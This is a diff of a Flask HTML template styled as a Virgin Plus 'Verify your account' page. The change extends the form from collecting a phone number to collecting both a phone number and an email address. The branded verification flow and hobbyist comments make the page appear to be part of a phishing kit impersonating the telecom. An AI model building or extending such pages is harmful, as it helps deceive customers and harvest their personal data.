@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <!-- So it looks correct on mobile -->
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verify Phone</title>
+  <title>Verify Phone and Email</title>
   <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
 </head>
 <body>
@@ -16,7 +16,7 @@
     <div class="header-left">
       <!-- If you want the big offset, add margin-left: 20rem in your style.css 
            or remove if you prefer. -->
-      <img src="static/images/virgin-logo.png" alt="Virgin Plus Logo">
+      <img src="{{ url_for('static', filename='images/virgin-logo.png') }}" alt="Virgin Plus Logo">
     </div>
 
     <!-- Desktop nav: FR + user icon, hidden on mobile if you want -->
@@ -27,7 +27,7 @@
 
     <!-- If you want a hamburger on verify too, add this. If not, remove. -->
     <div class="hamburger" onclick="toggleMobileMenu()">
-      &#9776;
+      &#9776; <!-- The “3 lines” icon -->
     </div>
   </header>
 
@@ -35,7 +35,7 @@
   <nav class="mobile-menu" id="mobileMenu">
     <div class="mobile-menu-header">
       <span class="close-btn" onclick="toggleMobileMenu()">&times;</span>
-      <img src="static/images/virgin-logo.png" alt="Virgin Plus Logo" />
+      <img src="{{ url_for('static', filename='images/virgin-logo.png') }}" alt="Virgin Plus Logo" />
     </div>
     <ul>
       <li><a href="#">FRANÇAIS</a></li>
@@ -50,15 +50,18 @@
     <!-- left-col = "Verify your account" text -->
     <div class="left-col">
       <h2>Verify your account</h2>
-      <p>Enter the main phone number on file.</p>
+      <p>Enter the main phone number and your email address on file.</p>
     </div>
 
-    <!-- right-col = the actual phone verification form -->
+    <!-- right-col = the actual phone and email verification form -->
     <div class="right-col">
-      <h1>Phone Verification</h1>
+      <h1>Phone and Email Verification</h1>
       <form action="{{ url_for('verify') }}" method="POST">
         <label for="phone_number" class="input-label">Phone number</label>
-        <input type="text" name="phone_number" id="phone_number" placeholder="e.g. 416-123-4567">
+        <input type="text" name="phone_number" id="phone_number" placeholder="e.g. 416-123-4567" required>
+
+        <label for="email" class="input-label">Email Address</label>
+        <input type="email" name="email" id="email" placeholder="e.g. user@example.com" required>
 
         <button type="submit" class="login-btn" style="margin-top: 1rem;">
           Verify
